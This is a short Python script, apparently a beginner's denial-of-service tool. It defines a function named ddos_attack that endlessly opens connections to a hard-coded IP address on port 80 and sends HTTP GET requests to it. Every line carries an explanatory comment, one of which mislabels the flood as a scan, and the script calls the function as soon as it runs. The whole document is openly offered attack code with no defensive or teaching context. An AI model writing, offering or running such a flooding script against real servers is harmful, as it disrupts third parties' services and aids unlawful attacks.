import socket # imports the socket module, which provides low-level networking interface to Python.

target_ip = "34.135.166.24" # the target IP address to scan
target_port = 80 # the target port to scan

def ddos_attack(): # defines a function called ddos_attack
    while True: # creates an infinite loop
        try: # tries to execute the following code
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creates a socket object
            s.connect((target_ip, target_port)) # connects to the target IP address and port
            request = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n" # creates a request string
            print(f"Sending request: {request}") # prints a message indicating that a request is being sent
            s.sendall(request.encode()) # sends the request string to the target IP address and port
            s.close() # closes the socket object
        except Exception as e: # catches any exceptions that occur during the execution of the code
            print(f"Error: {e}") # prints an error message

ddos_attack() # calls the ddos_attack function
